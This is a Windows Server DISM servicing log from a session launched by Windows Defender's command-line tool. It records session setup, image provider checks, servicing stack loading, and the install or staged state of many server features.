2025-05-16 23:05:26, Error                 DISM   DISM Package Manager: PID=3316 TID=2288 Failed to create session classID - waiting for a second and trying again, hr:0x8007045b - CDISMPackageManager::CreateCbsSession(hr:0x8007045b)
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 DismApi.dll:                                            - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 DismApi.dll: <----- Starting DismApi.dll session -----> - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 DismApi.dll:                                            - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 DismApi.dll: Host machine information: OS Version=10.0.20348, Running architecture=amd64, Number of processors=2 - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 DismApi.dll: API Version 10.0.20348.1 - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 DismApi.dll: Parent process command line: "C:\Program Files\Windows Defender\MpCmdRun.exe" -Roles - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Input parameters: LogLevel: 2, LogFilePath: (null), ScratchDirectory: (null) - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Initialized GlobalConfig - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Initialized SessionTable - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Lookup in table by path failed for: DummyPath-2BA51B78-C7F7-4910-B99D-BB7345357CDC - CTransactionalImageTable::LookupImagePath
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Waiting for m_pInternalThread to start - CCommandThread::Start
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3364 Enter CCommandThread::CommandThreadProcedureStub - CCommandThread::CommandThreadProcedureStub
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3364 Enter CCommandThread::ExecuteLoop - CCommandThread::ExecuteLoop
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 CommandThread StartupEvent signaled - CCommandThread::WaitForStartup
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 m_pInternalThread started - CCommandThread::Start
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Created g_internalDismSession - DismInitializeInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Input parameters: ImagePath: DISM_{53BFAE52-B167-4E2F-A258-0A37B57FF845}, WindowsDirectory: (null), SystemDrive: (null) - DismOpenSessionInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Lookup in table by path failed for: DRIVE_C - CTransactionalImageTable::LookupImagePath
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Waiting for m_pInternalThread to start - CCommandThread::Start
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3372 Enter CCommandThread::CommandThreadProcedureStub - CCommandThread::CommandThreadProcedureStub
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 CommandThread StartupEvent signaled - CCommandThread::WaitForStartup
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 m_pInternalThread started - CCommandThread::Start
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3372 Enter CCommandThread::ExecuteLoop - CCommandThread::ExecuteLoop
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Successfully enqueued command object - CCommandThread::EnqueueCommandObject
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3372 ExecuteLoop: CommandQueue signaled - CCommandThread::ExecuteLoop
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3372 Successfully dequeued command object - CCommandThread::DequeueCommandObject
2025-05-16 23:05:50, Info                  DISM   PID=3280 TID=3372 Scratch directory set to 'C:\Windows\TEMP\'. - CDISMManager::put_ScratchDir
2025-05-16 23:05:50, Info                  DISM   PID=3280 TID=3372 DismCore.dll version: 10.0.20348.1 - CDISMManager::FinalConstruct
2025-05-16 23:05:50, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:50, Info                  DISM   PID=3280 TID=3372 Successfully loaded the ImageSession at "C:\Windows\system32\Dism" - CDISMManager::LoadLocalImageSession
2025-05-16 23:05:50, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:50, Info                  DISM   DISM Provider Store: PID=3280 TID=3372 Found and Initialized the DISM Logger. - CDISMProviderStore::Internal_InitializeLogger
2025-05-16 23:05:50, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:50, Info                  DISM   DISM Manager: PID=3280 TID=3372 Successfully created the local image session and provider store. - CDISMManager::CreateLocalImageSession
2025-05-16 23:05:50, Info                  DISM   DISM FFU Provider: PID=3280 TID=3372 [C:\] is not recognized by the DISM FFU provider. - CFfuImage::Initialize
2025-05-16 23:05:50, Info                  DISM   DISM Imaging Provider: PID=3280 TID=3372 The provider FfuManager does not support CreateDismImage on C:\ - CGenericImagingManager::CreateDismImage
2025-05-16 23:05:50, Info                  DISM   DISM VHD Provider: PID=3280 TID=3372 [C:\] is not recognized by the DISM VHD provider. - CVhdImage::Initialize
2025-05-16 23:05:50, Info                  DISM   DISM Imaging Provider: PID=3280 TID=3372 The provider VHDManager does not support CreateDismImage on C:\ - CGenericImagingManager::CreateDismImage
[3280.3372] [0x8007007b] FIOReadFileIntoBuffer:(1458): The filename, directory name, or volume label syntax is incorrect.
[3280.3372] [0xc142011c] UnmarshallImageHandleFromDirectory:(641)
[3280.3372] [0xc142011c] WIMGetMountedImageHandle:(2910)
2025-05-16 23:05:50, Info                  DISM   DISM WIM Provider: PID=3280 TID=3372 [C:\] is not a WIM mount point. - CWimMountedImageInfo::Initialize
2025-05-16 23:05:50, Info                  DISM   DISM Imaging Provider: PID=3280 TID=3372 The provider WimManager does not support CreateDismImage on C:\ - CGenericImagingManager::CreateDismImage
2025-05-16 23:05:50, Info                  DISM   DISM Imaging Provider: PID=3280 TID=3372 No imaging provider supported CreateDismImage for this path - CGenericImagingManager::CreateDismImage
[3280.3372] [0x8007007b] FIOReadFileIntoBuffer:(1458): The filename, directory name, or volume label syntax is incorrect.
[3280.3372] [0xc142011c] UnmarshallImageHandleFromDirectory:(641)
[3280.3372] [0xc142011c] WIMGetMountedImageHandle:(2910)
2025-05-16 23:05:50, Info                  DISM   DISM WIM Provider: PID=3280 TID=3372 [C:\] is not a WIM mount point. - CWimMountedImageInfo::Initialize
2025-05-16 23:05:50, Info                  DISM   DISM FFU Provider: PID=3280 TID=3372 [C:\] is not recognized by the DISM FFU provider. - CFfuImage::Initialize
2025-05-16 23:05:50, Info                  DISM   DISM VHD Provider: PID=3280 TID=3372 [C:\] is not recognized by the DISM VHD provider. - CVhdImage::Initialize
2025-05-16 23:05:50, Info                  DISM   DISM Manager: PID=3280 TID=3372 physical location path: C:\ - CDISMManager::CreateImageSession
2025-05-16 23:05:50, Info                  DISM   DISM Manager: PID=3280 TID=3372 Event name for current DISM session is Global\{A3D976C6-44E0-4751-B78B-B15BE64F8407} - CDISMManager::CheckSessionAndLock
2025-05-16 23:05:50, Info                  DISM   DISM Manager: PID=3280 TID=3372 Create session event 0x340 for current DISM session and event name is Global\{A3D976C6-44E0-4751-B78B-B15BE64F8407}  - CDISMManager::CheckSessionAndLock
2025-05-16 23:05:50, Info                  DISM   DISM Manager: PID=3280 TID=3372 Copying DISM from "C:\Windows\System32\Dism" - CDISMManager::CreateImageSessionFromLocation
2025-05-16 23:05:50, Info                  DISM   DISM Manager: PID=3280 TID=3372 Successfully loaded the ImageSession at "C:\Windows\TEMP\A63227FD-637C-4C98-A2D6-357A978B97CC" - CDISMManager::LoadRemoteImageSession
2025-05-16 23:05:50, Info                  DISM   DISM Image Session: PID=3544 TID=3572 Instantiating the Provider Store. - CDISMImageSession::get_ProviderStore
2025-05-16 23:05:50, Info                  DISM   DISM OS Provider: PID=3544 TID=3572 Defaulting SystemPath to C:\ - CDISMOSServiceManager::Final_OnConnect
2025-05-16 23:05:50, Info                  DISM   DISM OS Provider: PID=3544 TID=3572 Defaulting Windows folder to C:\Windows - CDISMOSServiceManager::Final_OnConnect
2025-05-16 23:05:50, Info                  DISM   DISM Provider Store: PID=3544 TID=3572 Attempting to initialize the logger from the Image Session. - CDISMProviderStore::Final_OnConnect
2025-05-16 23:05:50, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:50, Info                  DISM   DISM Provider Store: PID=3544 TID=3572 Found and Initialized the DISM Logger. - CDISMProviderStore::Internal_InitializeLogger
2025-05-16 23:05:50, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:50, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 23:05:50, Info                  DISM   DISM Manager: PID=3280 TID=3372 Image session successfully loaded from the temporary location: C:\Windows\TEMP\A63227FD-637C-4C98-A2D6-357A978B97CC - CDISMManager::CreateImageSession
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3372 Target image information: OS Version=10.0.20348.405, Image architecture=amd64 - CDismCore::LogImageSessionDetails
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Session id is: 2 - DismOpenSessionInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Input parameters: Session: 2, Identifier: (null), PackageIdentifier: 0 - DismGetFeaturesInternal
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3372 ExecuteLoop: CommandQueue signaled - CCommandThread::ExecuteLoop
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3284 Successfully enqueued command object - CCommandThread::EnqueueCommandObject
2025-05-16 23:05:50, Info                  DISM   API: PID=3280 TID=3372 Successfully dequeued command object - CCommandThread::DequeueCommandObject
2025-05-16 23:05:50, Info                  CSI    00000001 Shim considered [l:125]'\??\C:\Windows\Servicing\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.403_none_f21fbb46513ab2d5\wcp.dll' : got STATUS_OBJECT_PATH_NOT_FOUND
2025-05-16 23:05:50, Info                  CSI    00000002 Shim considered [l:122]'\??\C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.403_none_f21fbb46513ab2d5\wcp.dll' : got STATUS_SUCCESS
2025-05-16 23:05:50, Info                  DISM   DISM OS Provider: PID=3544 TID=3572 Determined System directory to be C:\Windows\System32 - CDISMOSServiceManager::get_SystemDirectory
2025-05-16 23:05:50, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Finished initializing the CbsConUI Handler. - CCbsConUIHandler::Initialize
2025-05-16 23:05:50, Info                  CSI    00000001 Shim considered [l:125]'\??\C:\Windows\Servicing\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.403_none_f21fbb46513ab2d5\wcp.dll' : got STATUS_OBJECT_PATH_NOT_FOUND
2025-05-16 23:05:50, Info                  CSI    00000002 Shim considered [l:122]'\??\C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.20348.403_none_f21fbb46513ab2d5\wcp.dll' : got STATUS_SUCCESS
2025-05-16 23:05:50, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 CBS is being initialized for online use. More information about CBS actions can be located at: %windir%\logs\cbs\cbs.log - CDISMPackageManager::Initialize
2025-05-16 16:05:26, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Loaded servicing stack for online use only. - CDISMPackageManager::CreateCbsSession
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Server-Core with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NetFx4ServerFeatures with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NetFx4 with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NetFx4Extended-ASPNET45 with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WCF-Services45 with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WCF-HTTP-Activation45 with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WCF-TCP-Activation45 with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WCF-Pipe-Activation45 with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WCF-MSMQ-Activation45 with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WCF-TCP-PortSharing45 with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ManagementOdata with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:32, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DSC-Service with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DeviceHealthAttestationService with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IPAMServerFeature with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RightsManagementServices-Role with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RightsManagementServices with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RMS-Federation with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RightsManagementServices-AdminTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ADCertificateServicesRole with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature CertificateServices with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature OnlineRevocationServices with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WebEnrollmentServices with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NetworkDeviceEnrollmentServices with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature CertificateEnrollmentPolicyServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature CertificateEnrollmentServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature HostGuardianService-Package with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Web-Application-Proxy with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IdentityServer-SecurityTokenService with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FSRM-Infrastructure with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-FCI-Client-Package with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FSRM-Infrastructure-Services with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-InternetPrinting-Server with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WebAccess with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ActiveDirectory-PowerShell with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DirectoryServices-AdministrativeCenter with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:33, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DirectoryServices-DomainController with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DirectoryServices-ISM-Smtp with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature AuthManager with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IPAMClientFeature with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature UpdateServices-RSAT with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature UpdateServices-API with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature UpdateServices-UI with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature UpdateServices with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature UpdateServices-Services with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature UpdateServices-Database with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature UpdateServices-WidDatabase with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MicrosoftWindowsPowerShellRoot with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MicrosoftWindowsPowerShell with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature iSCSITargetServer-PowerShell with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature PKIClient-PSH-Cmdlets with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature KeyDistributionService-PSH-Cmdlets with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature TlsSessionTicketKey-PSH-Cmdlets with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Tpm-PSH-Cmdlets with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MicrosoftWindowsPowerShellV2 with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WindowsPowerShellWebAccess with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DataCenterBridging-LLDP-Tools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RemoteAccessMgmtTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RemoteAccessPowerShell with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RasServerAdminTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DamgmtTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:34, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Server-Psh-Cmdlets with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RemoteAccess with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RemoteAccessServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RasRoutingProtocols with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-WebServerRole with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-WebServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-CommonHttpFeatures with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-Security with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:35, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature IIS-RequestFiltering with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
